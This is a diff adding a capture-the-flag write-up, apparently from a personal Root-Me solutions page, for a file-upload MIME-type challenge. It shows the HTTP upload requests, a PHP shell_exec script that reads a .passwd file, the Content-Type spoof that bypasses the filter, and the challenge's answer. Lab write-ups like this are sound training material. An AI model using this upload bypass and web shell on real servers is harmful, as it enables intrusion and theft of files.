@@ -1,4 +1,4 @@
-# [Root-Me](./rootme.md) Root-Me Web Server [15/74]
+# [Root-Me](./rootme.md) Root-Me Web Server [16/74]
 
 Discover the mechanisms, protocols and technologies used on the Internet and learn to abuse them!
 
@@ -21,7 +21,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 13. [Install files](#install-files) 🗸
 14. [CRLF](#crlf) 🗸
 15. [File upload - Double extensions](#file-upload-double-extensions) 🗸
-16. [File upload - MIME type](#file-upload-mime-type)
+16. [File upload - MIME type](#file-upload-mime-type) 🗸
 17. [HTTP - Cookies](#http-cookies)
 18. [Insecure Code Management](#insecure-code-management)
 19. [JSON Web Token (JWT) - Introduction](#json-web-token-jwt-introduction)
@@ -1640,7 +1640,146 @@ Gg9LRz-hWSxqqUKd77-_q-6G8
 ### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
 
 ---
+	
+## File Upload MIME type
 
+- Author: g0uZ
+- Date: 26 December 2012
+- Points: 20
+- Level: 2
+
+### Statement
+
+Your goal is to hack this photo galery by uploading PHP code.
+Retrieve the validation password in the file .passwd.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch21/).
+
+### Resources
+
+1. [Secure file upload in PHP web applications](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Secure%20file%20upload%20in%20PHP%20web%20applications.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+We find an image gallery with image upload form.  We can test the image upload and see a MIME formatted POST request.
+
+Header:
+
+~~~
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------3162911777502860060858434462
+Content-Length: 49444
+Origin: http://challenge01.root-me.org
+DNT: 1
+Connection: keep-alive
+Referer: http://challenge01.root-me.org/web-serveur/ch21/?action=upload
+Cookie: PHPSESSID=10df48b1320c55e7f8560e6b846d6303; _ga_SRYSKX09J7=GS1.1.1642856008.3.0.1642856008.0; _ga=GA1.1.1548291302.1642841282
+Upgrade-Insecure-Requests: 1
+~~~
+
+Body:
+
+~~~
+-----------------------------3162911777502860060858434462
+Content-Disposition: form-data; name="file"; filename="newpic.jpg"
+Content-Type: image/jpeg
+
+####
+
+-----------------------------3162911777502860060858434462--
+~~~
+
+We can create a php script to show the passwd (saved as giveflag.php):
+
+~~~php
+<?php
+$output = shell_exec('cat ../../../.passwd');
+echo "<pre>$output</pre>";
+?>
+~~~
+
+We can try to submit and get a rejection "wrong file type":
+
+Header:
+
+~~~
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------4443321272302534311005483800
+Content-Length: 309
+Origin: http://challenge01.root-me.org
+DNT: 1
+Connection: keep-alive
+Referer: http://challenge01.root-me.org/web-serveur/ch21/?action=upload
+Cookie: PHPSESSID=10df48b1320c55e7f8560e6b846d6303; _ga_SRYSKX09J7=GS1.1.1642856008.3.0.1642856008.0; _ga=GA1.1.1548291302.1642841282
+Upgrade-Insecure-Requests: 1
+~~~
+
+Body:
+
+~~~
+-----------------------------4443321272302534311005483800
+Content-Disposition: form-data; name="file"; filename="giveflag.php"
+Content-Type: application/x-php
+
+<?php
+$output = shell_exec('cat ../../../.passwd');
+echo "<pre>$output</pre>";
+?>
+
+-----------------------------4443321272302534311005483800--
+~~~
+
+Changing the body to label the file as a jpeg, we can resubmit:
+
+~~~
+-----------------------------4443321272302534311005483800
+Content-Disposition: form-data; name="file"; filename="giveflag.php"
+Content-Type: image/jpeg
+
+<?php
+$output = shell_exec('cat ../../../.passwd');
+echo "<pre>$output</pre>";
+?>
+
+-----------------------------4443321272302534311005483800--
+~~~
+
+Navigating to the file, we get the password!
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+a7n4nizpgQgnPERy89uanf6T4
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+	
 Last updated Jan 2022.
 
 ## [djm89uk.github.io](https://djm89uk.github.io)
